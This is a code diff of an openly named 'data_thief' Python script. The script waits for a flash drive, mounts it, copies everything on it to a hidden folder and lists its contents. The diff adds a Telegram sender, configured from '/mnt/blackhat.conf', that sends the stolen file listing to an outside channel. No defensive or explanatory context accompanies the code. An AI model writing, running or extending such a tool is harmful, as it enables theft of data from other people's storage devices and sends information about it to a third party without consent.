@@ -1,6 +1,9 @@
 #!/usr/bin/python
 import time
 import os
+from telegram import Telegram
+
+telegram = Telegram("/mnt/blackhat.conf")
 
 def bash(cmd, sudo=False, suppress_output=False):
     if sudo:
@@ -15,14 +18,14 @@ def bash(cmd, sudo=False, suppress_output=False):
 if __name__ == "__main__":
     f_name  = "/mnt/data_thief/"  # Where should we extract the data to
     disk_name = "/dev/sda1"       # Name of disk we're robbing
-    mount_point = f"~/sdx_mnt/"
+    mount_point = "~/media/"
 
     # Check to see where we're running this
     system = bash("cat /etc/os-release")
     if "Buildroot" not in system.split("\n")[0]:
         f_name = "~/data_thief/"
         sudo = True
-    else: 
+    else:
         sudo = False
 
     bash(f"mkdir {f_name}", sudo, suppress_output=True)
@@ -32,7 +35,7 @@ if __name__ == "__main__":
     print("Insert Flash Drive")
     while(True):
         time.sleep(1)
-        output = bash(f"file {disk_name}", sudo) 
+        output = bash(f"file {disk_name}", sudo)
         if "No such file or directory" in output:
             retries += 1
             if retries > 10:
@@ -48,11 +51,12 @@ if __name__ == "__main__":
     bash(f"mount {disk_name} {mount_point}", sudo)
     print("Disk Mounted...")
     print("Contents...")
-    print(bash(f"ls -1 --color=never {mount_point}"))
+    con = bash(f"ls -1 --color=never {mount_point}")
+    print(con)
+    telegram.send(f"{con}")
 
     print("Copying Contents")
     bash(f"cp -r {mount_point}* {f_name}", sudo)
     print("Done")
 
     bash(f"umount {mount_point}", sudo)
-    bash(f"rmdir {mount_point}", sudo)
